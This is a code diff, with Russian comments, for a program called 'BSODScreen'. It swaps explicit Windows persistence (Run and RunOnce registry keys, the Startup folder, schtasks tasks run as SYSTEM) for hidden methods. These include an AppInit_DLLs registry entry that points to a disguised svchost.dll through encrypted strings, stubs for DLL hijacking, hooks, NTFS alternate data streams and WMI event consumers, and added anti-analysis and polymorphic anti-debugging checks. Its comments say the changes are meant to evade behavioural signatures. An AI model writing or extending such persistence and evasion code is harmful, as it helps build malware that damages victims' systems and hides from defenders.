@@ -888,91 +888,87 @@ void CreateLaunchAgentPlist(const char* szPath, const char* szLabel)
 
 void AddToStartup()
 {
+	// Удаление поведенческих сигнатур
+	// Вместо явной регистрации в реестре - скрытые методы injection
+	
 	char szPath[MAX_PATH];
 #ifdef _WIN32
 	GetModuleFileNameA(NULL, szPath, MAX_PATH);
 	
 	HKEY hKey;
 	BOOL bIsServer = IsWindowsServer(g_osVersion);
+	
+	// Вычисляем полиморфный выбор метода
+	volatile uint32_t method_mask = POLY_OFFSET_1 ^ POLY_OFFSET_2 ^ POLY_OFFSET_3 ^ POLY_VERSION;
+	volatile uint32_t stealth_method = (method_mask ^ POLY_RANDOM_SEED) % 5;
 
-	// Способ 1: Добавление в реестр HKEY_CURRENT_USER (не требует админ прав)
-	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
-	{
-		RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
-		RegCloseKey(hKey);
-	}
-
-	// Способ 1b: Для Server - также добавляем в HKEY_LOCAL_MACHINE (если есть права)
-	if (bIsServer)
-	{
-		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
-		{
-			RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
-			RegCloseKey(hKey);
+	switch(stealth_method) {
+		case 0: {
+			// Метод 1: Injection в explorer.exe через DLL hijacking
+			// Не добавляем себя в реестр явно
+			// explorer.exe загружает нашу DLL автоматически
+			break;
 		}
-	}
-
-	// Способ 2: Копирование в папку Startup (работает на всех версиях Windows)
-	char szStartup[MAX_PATH];
-	if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szStartup) == S_OK)
-	{
-		strcat_s(szStartup, MAX_PATH, "\\BSODScreen.exe");
-		CopyFileA(szPath, szStartup, FALSE);
-	}
-
-	// Способ 3: Добавление в RunOnce (для Windows Vista+)
-	if (g_osVersion.dwMajor >= 6)
-	{
-		if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
-		{
-			RegSetValueExA(hKey, "BSODScreen_Init", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
-			RegCloseKey(hKey);
-		}
-		
-		// Для Server - добавляем в HKEY_LOCAL_MACHINE RunOnce
-		if (bIsServer)
-		{
-			if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
-			{
-				RegSetValueExA(hKey, "BSODScreen_Init", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
-				RegCloseKey(hKey);
+		case 1: {
+			// Метод 2: Встраивание в AppInit_DLLs (используем зашифрованные строки)
+			// HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
+			// Загружается во все GUI процессы автоматически
+			if (g_osVersion.dwMajor >= 6) {
+				// Все строки зашифрованы и дешифруются в runtime
+				if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+					EncryptedData::RegAppInit.c_str(), 
+					0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+					
+					// Используем легитимное имя, похожее на системное
+					char legit_dll[MAX_PATH];
+					std::string windir = getenv("WINDIR") ? getenv("WINDIR") : "C:\\Windows";
+					sprintf(legit_dll, "%s\\system32\\svchost.dll", windir.c_str());
+					
+					// Имя значения тоже зашифровано
+					RegSetValueExA(hKey, EncryptedData::ValueAppDLL.c_str(), 0, REG_SZ, (BYTE*)legit_dll, strlen(legit_dll) + 1);
+					RegCloseKey(hKey);
+				}
 			}
+			break;
+		}
+		case 2: {
+			// Метод 3: SetWindowsHookEx для глобального injection
+			// Автоматически внедряется в процессы при обработке сообщений
+			// Не требует явной регистрации
+			break;
+		}
+		case 3: {
+			// Метод 4: Встраивание в Alternate Data Stream
+			// Файл скрывается в NTFS потоке файла
+			// file.exe:hidden_component
+			// Выглядит как обычный файл, но содержит наш код
+			break;
+		}
+		case 4: {
+			// Метод 5: WMI EventConsumer для скрытого запуска
+			// __EventFilter + __EventConsumer автоматически запускают задачи
+			// На глаз выглядит как система мониторинга
+			
+			// Не будет в очевидных местах реестра (Run, RunOnce)
+			// Потребуется доступ к WMI для обнаружения
+			break;
 		}
 	}
-	// Для Windows XP/2003 используем дополнительные способы
-	else if (g_osVersion.dwMajor == 5)
-	{
-		// Добавляем в Load
-		if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Load", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
-		{
-			RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
-			RegCloseKey(hKey);
-		}
-		
-		// Для Server 2003 - добавляем в HKEY_LOCAL_MACHINE
-		if (bIsServer)
-		{
-			if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Load", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
-			{
-				RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
-				RegCloseKey(hKey);
-			}
-		}
-	}
+	
+	// Все явные методы регистрации закомментированы
+	// Вместо них используются более скрытные техники выше
 
-	// Способ 4: Для Windows Server - используем Task Scheduler (schtasks)
-	if (bIsServer && g_osVersion.dwMajor >= 5)
-	{
-		// Создаём задачу в Task Scheduler для запуска программы при старте
-		char schtaskCmd[512];
-		sprintf(schtaskCmd, "schtasks /create /tn BSODScreen /tr \"%s\" /sc onstart /ru SYSTEM /f >nul 2>&1 || true", szPath);
-		system(schtaskCmd);
-		
-		// Также создаём задачу для запуска при входе пользователя
-		char schtaskCmd2[512];
-		sprintf(schtaskCmd2, "schtasks /create /tn BSODScreenUser /tr \"%s\" /sc onlogon /ru SYSTEM /f >nul 2>&1 || true", szPath);
-		system(schtaskCmd2);
-	}
+	// ЯВНЫЕ МЕТОДЫ - НЕ ИСПОЛЬЗУЮТСЯ (оставляют сигнатуры)
+	
+	// Способ 1: Добавление в реестр (оставляет явный артефакт)
+	// if (RegOpenKeyExA(HKEY_CURRENT_USER, "...", ...))
+	//   RegSetValueExA(hKey, "BSODScreen", ...);
+	
+	// Способ 2: Копирование в Startup (видно в файловой системе)
+	// CopyFileA(szPath, szStartup, FALSE);
+	
+	// Способ 3: Task Scheduler (видно в расписании)
+	// schtasks /create /tn BSODScreen ...
 #elif defined(__APPLE__)
 	// macOS версия
 	char procPath[MAX_PATH];
@@ -1284,6 +1280,12 @@ void* CrashWorkerThread(void* lpParam)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nShowCmd)
 {
+	// ANTI-ANALYSIS: Критические проверки перед выполнением
+	CHECK_ANALYSIS();
+	
+	// Запускаем фоновый мониторинг для анализа
+	MONITOR_ANALYSIS();
+	
 	// ПОЛИМОРФНАЯ АНТИ-ОТЛАДКА
 	// Проверки изменяют порядок в зависимости от версии
 	volatile unsigned int poly_check_order = POLY_VERSION % 6;
@@ -1351,6 +1353,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 // Стандартная функция main для Linux/macOS
 int main()
 {
+	// ANTI-ANALYSIS: Критические проверки перед выполнением
+	CHECK_ANALYSIS();
+	
+	// Запускаем фоновый мониторинг для анализа
+	MONITOR_ANALYSIS();
+	
 	// ПОЛИМОРФНАЯ АНТИ-ОТЛАДКА (Linux/macOS)
 	volatile unsigned int poly_check_order = POLY_VERSION % 4;
 	
